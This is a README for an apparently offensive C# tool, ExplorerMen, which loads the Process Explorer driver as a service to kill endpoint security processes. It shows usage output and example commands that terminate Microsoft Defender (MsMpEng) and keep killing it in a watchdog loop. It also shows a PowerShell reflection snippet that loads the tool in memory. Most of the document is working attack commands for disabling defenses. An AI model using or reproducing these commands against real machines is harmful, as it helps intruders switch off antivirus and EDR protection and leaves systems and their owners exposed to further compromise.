C# implementation of [Passenger](https://github.com/Yair-Men/Passenger)

Basically, using ProcExp Driver to kill EDRs.

One mode kills the process once, while the second (`/watchdog`) keeps monitoring for when a new process is up and kills it again (each time)



```PowerShell
PS C:\Users\Windy> .\source\repos\ExplorerMen\bin\x64\Release\ExplorerMen.exe
[-] Failed to parse args
[!] Try to use /usage, /help, /examples


PS C:\Users\Windy> .\source\repos\ExplorerMen\bin\x64\Release\ExplorerMen.exe /usage
==== Usage ====
ExplorerMen.exe { /install:<DRIVER_FILE_FULL_PATH> || /service:<SERVICE_NAME> } { /pid:<PID> || /name:<PROCESS_NAME> } [/watchdog]


PS C:\Users\Windy> .\source\repos\ExplorerMen\bin\x64\Release\ExplorerMen.exe /examples
==== Example ====
[!] Load driver at C:\driver.sys as service with the name nonsense and kill process with id 123
ExplorerMen.exe /install:C:\driver.sys /service:nonsense /pid 123

[!] Start the service nonsense and kill process with name MsMpEng.exe
ExplorerMen.exe /service:nonsense /name:MsMpEng

[!] Start the service nonsense and kill process with id 123. Keep monitor the process, kill it everytime it is up again
ExplorerMen.exe /service:nonsense /pid:123 /watchdog
```


Use reflection from PowerShell:
```PowerShell
# Load the assembly into a variable
$asm = [IO.File]::ReadAllBytes("C:\Users\Windy\source\ExplorerMen\bin\x64\Release\ExplorerMen.exe")

# Use reflection to load it into current process memory space
[System.Reflection.Assembly]::Load($asm)

# Launch the app, search for the service name procexp152 and kill process named msmpeng
[ExplorerMen.Program]::Main("/service:procexp152 /name:msmpeng".Split())
```
